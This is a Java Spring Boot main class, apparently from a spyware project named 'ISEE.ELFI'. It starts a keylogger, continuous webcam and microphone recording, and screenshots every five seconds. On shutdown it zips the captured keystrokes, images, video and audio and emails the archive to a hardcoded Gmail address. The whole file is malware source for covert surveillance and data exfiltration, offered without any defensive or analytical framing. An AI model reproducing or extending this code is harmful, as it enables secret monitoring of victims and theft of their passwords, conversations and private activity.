package com.isee.elfi;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.io.IOException;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import static com.isee.elfi.EmailSender.sendEmailWithInMemoryAttachment;

@SpringBootApplication
public class ElfiApplication {
    public static void main(String[] args) {
        // AWT Headless modunu devre dışı bırakıyoruz
        System.setProperty("java.awt.headless", "false");

        SpringApplication.run(ElfiApplication.class, args);

        KeyLogger keyLogger = new KeyLogger();
        VoiceCapture recorder = new VoiceCapture();

        // Keylogger'ı yeni bir thread'de başlatıyoruz
        // Keylogger'ı başlat
        new Thread(keyLogger::startKeyLogger).start();
        // Kamerayı yeni bir thread'de başlatıyoruz
        new Thread(() -> {
            CameraCapture.capture(); // Kamerayı başlat
        }).start();

        // ScheduledExecutorService kullanarak her 5 saniyede bir ekran görüntüsü al
        ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
        executor.scheduleAtFixedRate(() -> {
            ScreenCapture.captureScreen(); // Her 5 saniyede bir ekran görüntüsü alır
        }, 0, 5, TimeUnit.SECONDS); // İlk başlatma zamanını 0, tekrar aralığını 5 saniye ayarlıyoruz


        recorder.startRecording();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            System.out.println("Application is closing...");
            recorder.stopRecording();
            // Example: Use the com.isee.elfi.FileZipper class to zip a file
            String toEmail = "mertayhandev@gmail.com";
            String subject = "ISEE.ELFI DENEME";
            String bodyText = "This email contains a ZIP file attachment.";

            String sourcePath = System.getProperty("user.dir") + "\\resources"; // Path to the file or directory
            String zipFileName = "file.zip"; // Name of the ZIP file attachment


            try {
                // Retrieve images from the static list
                List<byte[]> imageList = ScreenCapture.getImageList();

                // Create a map to hold file names and byte arrays
                Map<String, byte[]> fileContents = new LinkedHashMap<>();
                for (int index = 0; index < imageList.size(); index++) {
                    String fileName = "image_" + (index + 1) + ".png";
                    fileContents.put(fileName, imageList.get(index));
                }

                try {
                    byte[] logBytes = KeyLogger.savedBytes;
                    if (logBytes != null) {
                        fileContents.put("keylogger.txt", logBytes);
                        System.out.println("Keylogger log saved to file and added to the map.");
                    }
                } catch (Exception e) {
                    System.out.println(e.getMessage());
                }

                try {
                    CameraCapture.close();
                     byte[] videoByte = CameraCapture.videoByte;
                    if (videoByte != null) {
                        fileContents.put("video.flv", videoByte);
                        System.out.println("Video byte saved to file and added to the map.");
                    }
                } catch (Exception e) {
                    System.out.println(e.getMessage());
                }

               try {
                   byte[] audioBytes = recorder.getAudioBytes();
                   if (audioBytes != null) {
                       fileContents.put("output.wav", audioBytes);
                   }
               } catch (Exception e) {
                  System.out.println(e.getMessage());
               }

                // Zip the images
                Zipper zipper = new Zipper();
                byte[] zipData = zipper.zipFiles(fileContents);

                System.out.println("ZIP file created in memory, size: " + zipData.length + " bytes.");
                // Send the ZIP as an email attachment
                sendEmailWithInMemoryAttachment(toEmail, subject, bodyText, zipData, zipFileName);

            } catch (IOException e) {
                System.err.println("Error while creating the ZIP file: " + e.getMessage());
            }
        }));

    }
}
